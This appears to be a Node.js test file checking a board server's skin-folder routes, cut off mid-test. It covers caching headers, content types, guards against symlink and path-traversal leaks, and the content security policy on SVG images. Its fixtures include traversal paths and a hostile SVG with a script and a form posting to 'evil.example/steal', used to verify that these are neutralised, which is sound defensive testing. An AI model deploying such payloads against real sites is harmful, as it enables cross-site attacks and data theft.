// Checkpoint 4: the skin folder wired into the real server (R165, R168, R169, R170, R77 cache lines, R78, R79, R80, R107).
// Written from the contract text alone. The harness mirrors server.test.mjs and proxy-secret.test.mjs (their helpers are not
// exported): the real server on a small invented GitHub, a real socket, BOARD_SKIN_DIR in the environment.
// Every folder this file makes is created under os.tmpdir() with mkdtempSync and removed in after().
//
// Decisions the contract leaves open (each one stated where it is used):
//  - a query string is cut off before the path is matched, exactly as for /static/board.css, so `/skin/skin.css?v=1` answers 200;
//  - the path is matched as sent: no percent-decoding, no normalising, so `/skin/fonts/neutral%2ewoff2` and
//    `/skin/fonts/../skin.css` answer 404;
//  - another method on a skin path answers 405 with `Allow: GET`, as a static file does.
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { routes as worldRoutes, issues as worldIssues, apiIssue, R } from '../fixtures/github/world.mjs';

const { start } = await import('../board/server.mjs');

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURE_SKIN = path.join(HERE, '..', 'fixtures', 'skin');
const GH_TOKEN = 'SENTINEL-TOKEN-123-do-not-leak';
const SECRET = 'PROXY+SECRET/sentinel-0123456789abcdefXYZ';
const WRONG = 'not-the-secret-at-all';
const WRONG_SAME_LENGTH = `${SECRET.slice(0, -1)}Q`;
const CLOCK = { now: () => Date.parse('2026-10-12T06:10:00Z') };
const FORM = { 'content-type': 'application/x-www-form-urlencoded' };
const ID = 'x-board-user';
const H = 'x-board-proxy-secret';
const PROXY = { BOARD_MODE: 'proxy', BOARD_IDENTITY_HEADER: ID, BOARD_HOST: '127.0.0.1' };

const CSP_PLAIN = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'";
const CSP_SVG = "default-src 'none'; style-src 'unsafe-inline'; form-action 'none'; sandbox";
const SENTINEL = 'SENTINEL-OUTSIDE-FILE-7d21b9';

// ---------------------------------------------------------------- temp folders

const made = [];
function mkRoot() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'skin-routes-'));
  made.push(root);
  return root;
}
after(() => {
  for (const root of made) {
    try { fs.chmodSync(root, 0o755); } catch { /* best effort */ }
    fs.rmSync(root, { recursive: true, force: true });
  }
});

// A copy of the neutral skin in a temp folder, edited by `edit(dir)`.
function copySkin(edit = () => {}) {
  const root = mkRoot();
  const dir = path.join(root, 'skin');
  fs.cpSync(FIXTURE_SKIN, dir, { recursive: true });
  edit(dir, root);
  return dir;
}
// A skin built from nothing: css text, fonts and img maps of name -> content.
function mkSkin({ css = 'html[data-skin] { --accent: #336699; }\n', fonts = {}, img = {} } = {}) {
  const root = mkRoot();
  const dir = path.join(root, 'skin');
  fs.mkdirSync(dir);
  if (css !== null) fs.writeFileSync(path.join(dir, 'skin.css'), css);
  for (const [sub, files] of [['fonts', fonts], ['img', img]]) {
    if (Object.keys(files).length === 0) continue;
    fs.mkdirSync(path.join(dir, sub));
    for (const [n, c] of Object.entries(files)) fs.writeFileSync(path.join(dir, sub, n), c);
  }
  return dir;
}

const fixtureFile = (rel) => fs.readFileSync(path.join(FIXTURE_SKIN, rel));
const SKIN_PATHS = {
  css: { url: '/skin/skin.css', file: 'skin.css', type: 'text/css; charset=utf-8', cache: 'no-store' },
  font: { url: '/skin/fonts/neutral.woff2', file: 'fonts/neutral.woff2', type: 'font/woff2', cache: 'private, max-age=3600' },
  png: { url: '/skin/img/neutral.png', file: 'img/neutral.png', type: 'image/png', cache: 'private, max-age=3600' },
  svg: { url: '/skin/img/neutral.svg', file: 'img/neutral.svg', type: 'image/svg+xml', cache: 'private, max-age=3600' },
};

// ---------------------------------------------------------------- an invented GitHub

function fakeResponse(status, body) {
  return { status, ok: status >= 200 && status < 300, headers: { get: () => null }, json: async () => body, text: async () => JSON.stringify(body) };
}

function settingsText() {
  const s = JSON.parse(fs.readFileSync(path.join(HERE, '..', 'fixtures', 'settings', 'base.json'), 'utf8'));
  s.projects = [{ key: 'house', number: 3 }];
  s.focus = ['house'];
  s.habits = [{ id: 'move', title: 'Move', start: '2026-09-22' }];
  s.season.goals = [{ title: 'Finish the kitchen and bathroom', project: 'house' }];
  return JSON.stringify(s);
}

function makeFetch({ theme = null } = {}) {
  const list = [...worldIssues(), apiIssue(20, { title: 'Plan the garden', labels: [{ id: 3, name: 'idea', color: 'cccccc' }] })];
  const table = worldRoutes({
    issues: list,
    files: {
      'board.config.json': settingsText(),
      'theme.json': theme === null ? null : JSON.stringify(theme),
      'state/brief.json': null, 'state/calendar.json': null, 'state/inbox.json': null, 'state/log.json': null, 'state/proposals.json': null,
    },
  });
  return async (url, init = {}) => {
    const method = (init && init.method) || 'GET';
    if (method !== 'GET') return fakeResponse(404, { message: 'Not Found' });
    const u = new URL(String(url));
    const key = u.pathname + u.search;
    if (key === `${R}/issues?state=all&per_page=100` || key.startsWith(`${R}/issues?state=all&per_page=100&since=`)) return fakeResponse(200, list);
    if (Object.prototype.hasOwnProperty.call(table, key)) return fakeResponse(200, table[key]);
    return fakeResponse(404, { message: 'Not Found' });
  };
}

// ---------------------------------------------------------------- requests and servers

function sendRequest(port, { method = 'GET', reqPath = '/', headers = {}, body = null } = {}) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = (v) => { if (!settled) { settled = true; resolve(v); } };
    const h = { host: `localhost:${port}`, ...headers };
    const req = http.request({ host: '127.0.0.1', port, method, path: reqPath, headers: h, agent: false }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const bytes = Buffer.concat(chunks);
        finish({ status: res.statusCode, statusLine: `HTTP/${res.httpVersion} ${res.statusCode} ${res.statusMessage}`, rawHeaders: res.rawHeaders, headers: res.headers, bytes, body: bytes.toString('utf8') });
      });
      res.on('error', () => finish({ status: 0, statusLine: 'aborted', rawHeaders: [], headers: {}, bytes: Buffer.alloc(0), body: '' }));
    });
    req.on('error', (err) => finish({ status: 0, statusLine: `client-error ${err && err.code}`, rawHeaders: [], headers: {}, bytes: Buffer.alloc(0), body: '' }));
    const timer = setTimeout(() => { req.destroy(); finish({ status: 0, statusLine: 'timeout', rawHeaders: [], headers: {}, bytes: Buffer.alloc(0), body: '' }); }, 15000);
    timer.unref();
    req.on('close', () => clearTimeout(timer));
    if (body !== null) req.write(body);
    req.end();
  });
}

async function withBoard({ env = {}, theme = null, log = null } = {}, fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skin-routes-data-'));
  let running = null;
  try {
    running = await start({
      processEnv: { BOARD_GITHUB_TOKEN: GH_TOKEN, BOARD_REPO: 'sam-life/life', BOARD_PORT: '0', BOARD_DATA_DIR: dir, ...env },
      fetch: makeFetch({ theme }), clock: CLOCK, log: (line) => { if (log) log.push(String(line)); },
    });
    return await fn({ port: running.address.port });
  } finally {
    if (running) await running.close();
    fs.rmSync(dir, { recursive: true, force: true });
  }
}
const withSkin = (skinDir, opts, fn) => withBoard({ ...opts, env: { ...(opts && opts.env), BOARD_SKIN_DIR: skinDir } }, fn);

// ---------------------------------------------------------------- equal answers (R77), form tokens set aside as well

function nonceOf(res, cell) {
  const csp = String(res.headers['content-security-policy'] ?? '');
  const inCsp = [...csp.matchAll(/'nonce-([^']+)'/g)].map((m) => m[1]);
  const inBody = [...res.body.matchAll(/\bnonce="([^"]*)"/g)].map((m) => m[1]);
  if (inCsp.length === 0 && inBody.length === 0) return null;
  assert.equal(inCsp.length, 1, `${cell}: one nonce in the policy`);
  assert.equal(inBody.length, 1, `${cell}: one nonce attribute in the body`);
  assert.equal(inBody[0], inCsp[0], `${cell}: the style block nonce equals the policy nonce`);
  return inCsp[0];
}
function pairsOf(res) {
  const pairs = [];
  for (let i = 0; i < res.rawHeaders.length; i += 2) {
    if (res.rawHeaders[i].toLowerCase() !== 'date') pairs.push([res.rawHeaders[i].toLowerCase(), res.rawHeaders[i + 1]]);
  }
  return pairs.sort((a, b) => (a[0] + a[1]).localeCompare(b[0] + b[1]));
}
function fixed(res, nonce, { ignore = [] } = {}) {
  const fix = (t) => (nonce === null ? String(t) : String(t).split(nonce).join('NONCE'));
  const tok = (t) => t.replace(/(name="token" value=")[^"]*(")/g, '$1TOKEN$2');
  return {
    pairs: pairsOf(res).filter(([k]) => !ignore.includes(k)).map(([k, v]) => [k, fix(v)]),
    body: res.bytes.equals(Buffer.from(res.body, 'utf8')) ? tok(fix(res.body)) : res.bytes,
  };
}
function sameAnswer(actual, expected, cell, opts = {}) {
  assert.equal(actual.status, expected.status, `${cell}: status`);
  assert.equal(actual.statusLine, expected.statusLine, `${cell}: status line`);
  const na = nonceOf(actual, `${cell} (actual)`);
  const nb = nonceOf(expected, `${cell} (expected)`);
  assert.equal(na === null, nb === null, `${cell}: both or neither carry a nonce`);
  const a = fixed(actual, na, opts);
  const b = fixed(expected, nb, opts);
  assert.deepEqual(a.pairs, b.pairs, `${cell}: headers apart from date and nonce`);
  assert.deepEqual(a.body, b.body, `${cell}: body apart from the nonce and form tokens`);
}

const footerOf = (html) => { const i = html.indexOf('data-section="footer"'); return i < 0 ? '' : html.slice(i); };
const beforeFooter = (html) => { const i = html.indexOf('data-section="footer"'); return i < 0 ? html : html.slice(0, i); };
const count = (s, needle) => s.split(needle).length - 1;

function assertNoFileContent(res, cell) {
  for (const f of ['skin.css', 'fonts/neutral.woff2', 'img/neutral.png', 'img/neutral.svg']) {
    const b = fixtureFile(f);
    assert.ok(!res.bytes.includes(b), `${cell}: no bytes of ${f}`);
  }
  assert.ok(!res.body.includes('html[data-skin]'), `${cell}: no skin css`);
  assert.ok(!res.body.includes('createApp'), `${cell}: no engine source`);
}

// ================================================================ R165 off path

const OFF_ROUTES = [
  { name: 'GET /', method: 'GET', reqPath: '/' },
  { name: 'GET /static/board.css', method: 'GET', reqPath: '/static/board.css' },
  { name: 'GET /static/board.js', method: 'GET', reqPath: '/static/board.js' },
  { name: 'GET /healthz', method: 'GET', reqPath: '/healthz' },
  { name: 'POST /actions/idea', method: 'POST', reqPath: '/actions/idea' },
  { name: 'POST /actions/habit', method: 'POST', reqPath: '/actions/habit' },
  { name: 'POST /actions/sort', method: 'POST', reqPath: '/actions/sort' },
  { name: 'POST /actions/close', method: 'POST', reqPath: '/actions/close' },
  { name: 'POST /actions/score', method: 'POST', reqPath: '/actions/score' },
  { name: 'PUT /', method: 'PUT', reqPath: '/' },
  { name: 'GET /actions/idea', method: 'GET', reqPath: '/actions/idea' },
  { name: 'GET /nonesuch', method: 'GET', reqPath: '/nonesuch' },
  { name: 'GET /skin/skin.css', method: 'GET', reqPath: '/skin/skin.css', is404: true },
  { name: 'GET /skin/fonts/neutral.woff2', method: 'GET', reqPath: '/skin/fonts/neutral.woff2', is404: true },
  { name: 'GET /skin/img/neutral.png', method: 'GET', reqPath: '/skin/img/neutral.png', is404: true },
  { name: 'PUT /skin/skin.css', method: 'PUT', reqPath: '/skin/skin.css', is404: true },
];
function offRequest(route, port, headers = {}) {
  const post = route.method === 'POST';
  return sendRequest(port, { method: route.method, reqPath: route.reqPath, headers: { ...(post ? { ...FORM, origin: `http://localhost:${port}` } : {}), ...headers }, body: post ? 'title=x' : null });
}

for (const [label, value] of [['unset', undefined], ['empty', ''], ['only spaces', '   ']]) {
  test(`R165 with the setting ${label}, every route answers as a board without the feature and /skin/skin.css is 404`, async () => {
    const env = value === undefined ? {} : { BOARD_SKIN_DIR: value };
    await withBoard({}, async ({ port: basePort }) => {
      await withBoard({ env }, async ({ port }) => {
        for (const route of OFF_ROUTES) {
          const a = await offRequest(route, port);
          const b = await offRequest(route, basePort);
          sameAnswer(a, b, `${label} / ${route.name}`);
          if (route.is404) assert.equal(a.status, route.method === 'GET' ? 404 : a.status, `${route.name}: 404`);
        }
        const page = await sendRequest(port, { reqPath: '/' });
        assert.equal(page.status, 200);
        assert.ok(!page.body.includes('/skin/'), 'no skin link');
        assert.ok(!page.body.includes('data-skin'), 'no data-skin');
        assert.ok(!(page.headers['content-security-policy'] || '').includes("font-src 'self'"), "no font-src 'self'");
        const css = await sendRequest(port, { reqPath: '/skin/skin.css' });
        assert.equal(css.status, 404);
        for (const r of [page, css]) assert.ok(!(r.headers['cache-control'] || '').includes('max-age=3600'), 'no max-age=3600');
      });
    });
  });
}

test('R165 a setting that names a folder that does not exist leaves every route as it was and adds exactly one skin-unreadable line to the footer', async () => {
  const gone = path.join(mkRoot(), 'no-such-folder');
  await withBoard({}, async ({ port: basePort }) => {
    await withSkin(gone, {}, async ({ port }) => {
      for (const route of OFF_ROUTES.filter((r) => r.reqPath !== '/')) sameAnswer(await offRequest(route, port), await offRequest(route, basePort), `unreadable / ${route.name}`);
      const base = await sendRequest(basePort, { reqPath: '/' });
      const page = await sendRequest(port, { reqPath: '/' });
      assert.equal(page.status, 200, 'the board starts and serves the page');
      assert.equal(page.headers['cache-control'], 'no-store');
      assert.equal(page.headers['content-security-policy'].replace(/'nonce-[^']+'/, 'N'), base.headers['content-security-policy'].replace(/'nonce-[^']+'/, 'N'));
      assert.deepEqual(fixed(page, nonceOf(page, 'p')).body.split('data-section="footer"')[0], fixed(base, nonceOf(base, 'b')).body.split('data-section="footer"')[0], 'everything before the footer is the same');
      assert.equal(count(page.body, 'The skin folder could not be read, so the board is shown without a skin.'), 1, 'one skin-unreadable sentence');
      assert.ok(!page.body.includes('/skin/skin.css') && !page.body.includes('data-skin'));
      assert.equal((await sendRequest(port, { reqPath: '/skin/skin.css' })).status, 404);
    });
  });
});

test('R165 a relative path is read from the folder the board was started in, and spaces around the value are removed', async () => {
  const rel = path.relative(process.cwd(), FIXTURE_SKIN);
  assert.ok(!path.isAbsolute(rel) && rel.length > 0);
  for (const value of [rel, `  ${FIXTURE_SKIN}  `, ` ${rel} `]) {
    await withSkin(value, {}, async ({ port }) => {
      const res = await sendRequest(port, { reqPath: '/skin/skin.css' });
      assert.equal(res.status, 200, `value ${JSON.stringify(value)}`);
      assert.ok(res.bytes.equals(fixtureFile('skin.css')));
    });
  }
});

test('R165 the folder is read once at start: files rewritten, added and removed afterwards change nothing served', async () => {
  const dir = copySkin();
  await withSkin(dir, {}, async ({ port }) => {
    const before = {};
    for (const [k, p] of Object.entries(SKIN_PATHS)) before[k] = await sendRequest(port, { reqPath: p.url });
    fs.writeFileSync(path.join(dir, 'skin.css'), 'html[data-skin] { --accent: #ff0000; } /* rewritten */\n');
    fs.writeFileSync(path.join(dir, 'img', 'added.png'), 'PNG-ADDED');
    fs.rmSync(path.join(dir, 'fonts', 'neutral.woff2'));
    fs.writeFileSync(path.join(dir, 'img', 'neutral.svg'), '<svg xmlns="http://www.w3.org/2000/svg"><!-- changed --></svg>');
    for (const [k, p] of Object.entries(SKIN_PATHS)) {
      const now = await sendRequest(port, { reqPath: p.url });
      assert.equal(now.status, 200, `${k} still served`);
      assert.ok(now.bytes.equals(before[k].bytes), `${k} bytes unchanged`);
    }
    assert.equal((await sendRequest(port, { reqPath: '/skin/img/added.png' })).status, 404, 'a file added later is not served');
  });
  // a fresh start sees the new bytes
  await withSkin(dir, {}, async ({ port }) => {
    const css = await sendRequest(port, { reqPath: '/skin/skin.css' });
    assert.ok(css.body.includes('rewritten'));
    assert.equal((await sendRequest(port, { reqPath: '/skin/fonts/neutral.woff2' })).status, 404);
    assert.equal((await sendRequest(port, { reqPath: '/skin/img/added.png' })).status, 200);
  });
});

test("R165 the folder's path appears in no page, no header, no warning text and no log line", async () => {
  const good = copySkin((d) => fs.writeFileSync(path.join(d, 'img', 'Bad Name.png'), 'x')); // one skipped file: a warning with a count
  const gone = path.join(mkRoot(), 'missing-skin-folder');
  for (const dir of [good, gone, FIXTURE_SKIN]) {
    const log = [];
    await withSkin(dir, { log }, async ({ port }) => {
      const answers = [];
      for (const p of ['/', '/static/board.css', '/healthz', '/nonesuch', '/skin/skin.css', '/skin/fonts/neutral.woff2', '/skin/img/neutral.png', '/skin/img/neutral.svg']) answers.push(await sendRequest(port, { reqPath: p }));
      for (const a of answers) {
        assert.ok(!a.body.includes(dir) && !a.body.includes(path.basename(path.dirname(dir))), 'no path in a body');
        assert.ok(!JSON.stringify(a.headers).includes(dir), 'no path in a header');
      }
    });
    for (const line of log) assert.ok(!line.includes(dir), 'no path in a log line');
  }
});

test('R165 a file outside the skin folder reachable only through a symbolic link inside it appears in no response', async () => {
  const root = mkRoot();
  const outside = path.join(root, 'outside');
  fs.mkdirSync(outside);
  fs.writeFileSync(path.join(outside, 'secret.txt'), SENTINEL);
  fs.writeFileSync(path.join(outside, 'secret.css'), `/* ${SENTINEL} */`);
  fs.mkdirSync(path.join(outside, 'folder'));
  fs.writeFileSync(path.join(outside, 'folder', 'a.png'), SENTINEL);
  const dir = copySkin((d) => {
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(d, 'img', 'leak.png'));
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(d, 'fonts', 'leak.woff2'));
    fs.symlinkSync(path.join(outside, 'secret.css'), path.join(d, 'leak.css'));
    fs.symlinkSync(path.join(outside, 'folder'), path.join(d, 'docs'));
  });
  const log = [];
  await withSkin(dir, { log }, async ({ port }) => {
    const paths = ['/', '/skin/skin.css', '/skin/img/leak.png', '/skin/fonts/leak.woff2', '/skin/leak.css', '/skin/docs/a.png', '/skin/img/neutral.png', '/skin/fonts/neutral.woff2', '/skin/img/neutral.svg'];
    for (const p of paths) {
      const res = await sendRequest(port, { reqPath: p });
      assert.ok(!res.bytes.includes(SENTINEL), `${p}: no sentinel in the body`);
      assert.ok(!JSON.stringify(res.headers).includes(SENTINEL), `${p}: no sentinel in a header`);
    }
    for (const p of ['/skin/img/leak.png', '/skin/fonts/leak.woff2', '/skin/leak.css', '/skin/docs/a.png']) assert.equal((await sendRequest(port, { reqPath: p })).status, 404, `${p}: not served`);
    // the two skipped links are counted: the page says so
    assert.ok((await sendRequest(port, { reqPath: '/' })).body.includes('2 skin files could not be used and were skipped.'));
  });
  assert.ok(!log.join('\n').includes(SENTINEL));
});

// ================================================================ R80 / R169 the routes

test('R169 each loaded path answers 200 with the file\'s exact bytes, its content type and the headers of R77', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    for (const [k, p] of Object.entries(SKIN_PATHS)) {
      const res = await sendRequest(port, { reqPath: p.url });
      assert.equal(res.status, 200, `${k}: status`);
      assert.ok(res.bytes.equals(fixtureFile(p.file)), `${k}: exact bytes`);
      assert.equal(res.headers['content-type'], p.type, `${k}: content type`);
      assert.equal(res.headers['x-content-type-options'], 'nosniff', `${k}: nosniff`);
      assert.equal(res.headers['referrer-policy'], 'same-origin', `${k}: referrer`);
      assert.equal(res.headers['cache-control'], p.cache, `${k}: cache line`);
      assert.equal(res.headers['content-length'], String(fixtureFile(p.file).length), `${k}: length`);
    }
  });
});

test('R80 a query string is cut off before the path is matched, as for a static file', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    const stat = await sendRequest(port, { reqPath: '/static/board.css?v=1' });
    assert.equal(stat.status, 200, 'the static route ignores a query string (the model for the skin routes)');
    for (const p of Object.values(SKIN_PATHS)) {
      const res = await sendRequest(port, { reqPath: `${p.url}?v=1` });
      assert.equal(res.status, 200, p.url);
      assert.ok(res.bytes.equals(fixtureFile(p.file)));
    }
  });
});

const NOT_FOUND = [
  '/skin', '/skin/', '/skin/fonts', '/skin/fonts/', '/skin/img/', '/skin/../server.mjs', '/skin/%2e%2e/x', '/skin/%2E%2E/server.mjs',
  '/skin/fonts/../skin.css', '/skin/img/../skin.css', '/skin/fonts/../../server.mjs', '/skin//skin.css', '/skin/./skin.css',
  '/skin/SKIN.css', '/skin/Skin.css', '/SKIN/skin.css', '/skin/fonts/NEUTRAL.woff2', '/skin/img/NEUTRAL.png', '/skin/img/neutral.PNG',
  '/skin/skin.css/', '/skin/fonts/neutral.woff2/', '/skin/img/neutral.png/',
  '/skin/fonts/neutral.png', '/skin/img/neutral.woff2', '/skin/fonts/missing.woff2', '/skin/img/missing.png', '/skin/missing.css',
  '/skin/neutral.png', '/skin/neutral.woff2', '/skin/fonts/neutral%2ewoff2', '/skin/fonts%2Fneutral.woff2', '/skin/img/neutral.png%00', '/skin/fonts/skin.css',
];
test('R80 unknown names and odd spellings answer 404 with no file content', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    // witness: the skin is on
    assert.equal((await sendRequest(port, { reqPath: '/skin/skin.css' })).status, 200);
    for (const p of NOT_FOUND) {
      const res = await sendRequest(port, { reqPath: p });
      assert.equal(res.status, 404, `${p}: status`);
      assertNoFileContent(res, p);
      assert.equal(res.headers['cache-control'], 'no-store', `${p}: no-store`);
    }
  });
});

test('R80 another method on a known skin path answers 405 and never the file; on an unknown skin path it answers 404', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    for (const p of Object.values(SKIN_PATHS)) {
      for (const method of ['PUT', 'POST', 'DELETE', 'PATCH']) {
        const res = await sendRequest(port, { method, reqPath: p.url, headers: method === 'POST' ? { ...FORM, origin: `http://localhost:${port}` } : {}, body: method === 'POST' ? 'a=b' : null });
        assert.equal(res.status, 405, `${method} ${p.url}`);
        assert.equal(res.headers.allow, 'GET', `${method} ${p.url}: Allow (as for a static file)`);
        assertNoFileContent(res, `${method} ${p.url}`);
      }
    }
    assert.equal((await sendRequest(port, { method: 'PUT', reqPath: '/skin/fonts/missing.woff2' })).status, 404);
    assert.equal((await sendRequest(port, { method: 'PUT', reqPath: '/skin/' })).status, 404);
  });
});

test('R80 without a skin the routes are the nine: every /skin/ path answers 404', async () => {
  await withBoard({}, async ({ port }) => {
    for (const p of ['/skin/skin.css', '/skin/fonts/neutral.woff2', '/skin/img/neutral.png', '/skin/', '/skin']) {
      assert.equal((await sendRequest(port, { reqPath: p })).status, 404, p);
    }
    assert.equal((await sendRequest(port, { method: 'PUT', reqPath: '/skin/skin.css' })).status, 404);
    for (const p of ['/', '/static/board.css', '/static/board.js', '/healthz']) assert.equal((await sendRequest(port, { reqPath: p })).status, 200, p);
  });
});

test('R80 the skin routes exist only for the names loaded: a skin of css only serves one skin path', async () => {
  const dir = mkSkin({ img: { 'b.png': 'PNGDATA' }, fonts: { 'a.woff2': 'wOF2data' } });
  await withSkin(dir, {}, async ({ port }) => {
    for (const p of ['/skin/skin.css', '/skin/fonts/a.woff2', '/skin/img/b.png']) assert.equal((await sendRequest(port, { reqPath: p })).status, 200, p);
    assert.equal((await sendRequest(port, { method: 'PUT', reqPath: '/skin/skin.css' })).status, 405);
    for (const p of ['/skin/fonts/A.woff2', '/skin/fonts/b.png', '/skin/img/a.woff2', '/skin/fonts/missing.woff2', '/skin/../server.mjs', '/skin/%2e%2e/x', '/skin/fonts/']) {
      const res = await sendRequest(port, { reqPath: p });
      assert.equal(res.status, 404, p);
      assert.ok(!res.body.includes('wOF2data') && !res.body.includes('PNGDATA') && !res.body.includes('html[data-skin]'), `${p}: no file content`);
    }
  });
  const cssOnly = mkSkin({});
  await withSkin(cssOnly, {}, async ({ port }) => {
    assert.equal((await sendRequest(port, { reqPath: '/skin/skin.css' })).status, 200);
    assert.equal((await sendRequest(port, { reqPath: '/skin/fonts/a.woff2' })).status, 404);
    assert.equal((await sendRequest(port, { reqPath: '/skin/img/b.png' })).status, 404);
  });
});

// ================================================================ R77 cache lines and policies on skin answers (R170)

test('R77 cache lines: private, max-age=3600 on a skin font and image only; no-store on the skin stylesheet and everywhere else', async () => {
  await withSkin(FIXTURE_SKIN, {}, async ({ port }) => {
    const none = { reqPath: '/nonesuch' };
    const answers = {
      page: await sendRequest(port, { reqPath: '/' }),
      static: await sendRequest(port, { reqPath: '/static/board.css' }),
      js: await sendRequest(port, { reqPath: '/static/board.js' }),
      health: await sendRequest(port, { reqPath: '/healthz' }),
      css: await sendRequest(port, { reqPath: '/skin/skin.css' }),
      notFound: await sendRequest(port, none),
      skinNotFound: await sendRequest(port, { reqPath: '/skin/fonts/missing.woff2' }),
      refusal405: await sendRequest(port, { method: 'PUT', reqPath: '/' }),
      skin405: await sendRequest(port, { method: 'PUT', reqPath: '/skin/skin.css' }),
      foreign: await sendRequest(port, { reqPath: '/skin/skin.css', headers: { host: 'evil.example' } }),
    };
    for (const [k, r] of Object.entries(answers)) assert.equal(r.headers['cache-control'], 'no-store', `${k}: no-store`);
    assert.equal((await sendRequest(port, { reqPath: SKIN_PATHS.font.url })).headers['cache-control'], 'private, max-age=3600');
    assert.equal((await sendRequest(port, { reqPath: SKIN_PATHS.png.url })).headers['cache-control'], 'private, max-age=3600');
    assert.equal((await sendRequest(port, { reqPath: SKIN_PATHS.svg.url })).headers['cache-control'], 'private, max-age=3600');
  });
});

test('R77 given no skin, every answer carries no-store and none carries max-age=3600', async () => {
  await withBoard({}, async ({ port }) => {
    for (const p of ['/', '/static/board.css', '/static/board.js', '/healthz', '/nonesuch', '/skin/skin.css', '/skin/fonts/neutral.woff2']) {
      const r = await sendRequest(port, { reqPath: p });
      assert.equal(r.headers['cache-control'], 'no-store', p);
    }
  });
});

test('R169 the plain policy of R77 on the stylesheet, a font and a raster image: no nonce, no font-src, no font host', async () => {
  await withSkin(FIXTURE_SKIN, { theme: { fonts: { source: 'google' } } }, async ({ port }) => {
    for (const k of ['css', 'font', 'png']) {
      const res = await sendRequest(port, { reqPath: SKIN_PATHS[k].url });
      assert.equal(res.headers['content-security-policy'], CSP_PLAIN, k);
      assert.ok(!res.headers['content-security-policy'].includes('nonce'));
      assert.ok(!res.headers['content-security-policy'].includes('font-src'));
      assert.ok(!res.headers['content-security-policy'].includes('fonts.g'));
    }
  });
});

test('R170 the vector image answers exactly the four headers of the rule, and its bytes are unchanged, hostile or not', async () => {
  const logo = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" style="fill:#336699"/></svg>';
  // the hostile twin: a script, an outside image and link, and an XHTML form inside a foreignObject that posts to another site
  const evil = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><image href="https://evil.example/x.png"/><a href="https://evil.example/"><rect width="5" height="5"/></a>'
    + '<foreignObject width="100" height="100"><form xmlns="http://www.w3.org/1999/xhtml" method="post" action="https://evil.example/steal"><input name="x" value="y"/><button type="submit">Go</button></form></foreignObject></svg>';
  const dir = mkSkin({ img: { 'logo.svg': logo, 'evil.svg': evil, 'plain.png': 'PNGBYTES' } });
  await withSkin(dir, {}, async ({ port }) => {
    for (const [name, text] of [['logo.svg', logo], ['evil.svg', evil]]) {
      const res = await sendRequest(port, { reqPath: `/skin/img/${name}` });
      assert.equal(res.status, 200, name);
      assert.equal(res.body, text, `${name}: bytes unchanged`);
      assert.equal(res.headers['content-type'], 'image/svg+xml', `${name}: type`);
      assert.equal(res.headers['content-security-policy'], CSP_SVG, `${name}: policy`);
      // default-src 'none' does not restrict where a form may post, and a vector image opened directly is a document:
      // form-action 'none' stops the foreignObject form from sending anything anywhere, and sandbox stops the document running.
      assert.ok(res.headers['content-security-policy'].includes("form-action 'none'"), `${name}: form-action 'none'`);
      assert.ok(/(^|; )sandbox($|;)/.test(res.headers['content-security-policy']), `${name}: sandbox`);
      assert.equal(res.headers['x-content-type-options'], 'nosniff', `${name}: nosniff`);
      assert.equal(res.headers['referrer-policy'], 'same-origin', `${name}: referrer`);
      assert.equal(res.headers['cache-control'], 'private, max-age=3600', `${name}: cache`);
    }
    const png = await sendRequest(port, { reqPath: '/skin/img/plain.png' });
    assert.equal(png.headers['content-security-policy'], CSP_PLAIN, 'a raster image has the plain policy, not the svg one');
    assert.equal(png.headers['content-type'], 'image/png');
  });
});

test('R169 content types by extension: webp and jpg as well', async () => {
  const dir = mkSkin({ img: { 'a.webp': 'WEBP', 'b.jpg': 'JPG', 'c.png': 'PNG' }, fonts: { 'f.woff2': 'wOF2' } });
  await withSkin(dir, {}, async ({ port }) => {
    for (const [p, t, body] of [['/skin/img/a.webp', 'image/webp', 'WEBP'], ['/skin/img/b.jpg', 'image/jpeg', 'JPG'], ['/skin/img/c.png', 'image/png', 'PNG'], ['/skin/fonts/f.woff2', 'font/woff2', 'wOF2']]) {
      const res = await sendRequest(port, { reqPath: p });
      assert.equal(res.status, 200, p);
      assert.equal(res.headers['content-type'], t, p);
      assert.equal(res.body, body, p);
      assert.equal(res.headers['content-security-policy'], CSP_PLAIN, p);
    }
  });
});

// ================================================================ R78 / R79 / R107 the guard grid

const SKIN_GUARDED = [SKIN_PATHS.css, SKIN_PATHS.font, SKIN_PATHS.png, SKIN_PATHS.svg];
const STATIC_REF = '/static/board.css';

test('R78 a foreign Host answers 421 with an empty body on /skin/skin.css, a skin font and a skin image, whatever else is sent', async () => {
  for (const env of [{}, { ...PROXY, BOARD_PROXY_SECRET: SECRET }]) {
    await withSkin(FIXTURE_SKIN, { env }, async ({ port }) => {
      for (const p of SKIN_GUARDED) {
        for (const extra of [{}, { [ID]: 'sam' }, { [H]: SECRET }, { [H]: SECRET, [ID]: 'sam' }, { [H]: WRONG }]) {
          const res = await sendRequest(port, { reqPath: p.url, headers: { host: 'evil.example', ...extra } });
          assert.equal(res.status, 421, p.url);
          assert.equal(res.body, '', p.url);
          assert.equal(res.bytes.length, 0);
          const stat = await sendRequest(port, { reqPath: STATIC_REF, headers: { host: 'evil.example', ...extra } });
          sameAnswer(res, stat, `${p.url} foreign host vs static`);
        }
      }
    });
  }
});

test('R79 in proxy mode a request with no identity header to a skin route gets the same 401 as /static/board.css', async () => {
  await withSkin(FIXTURE_SKIN, { env: PROXY }, async ({ port }) => {
    const ref = await sendRequest(port, { reqPath: STATIC_REF });
    assert.equal(ref.status, 401);
    for (const p of SKIN_GUARDED) {
      const res = await sendRequest(port, { reqPath: p.url });
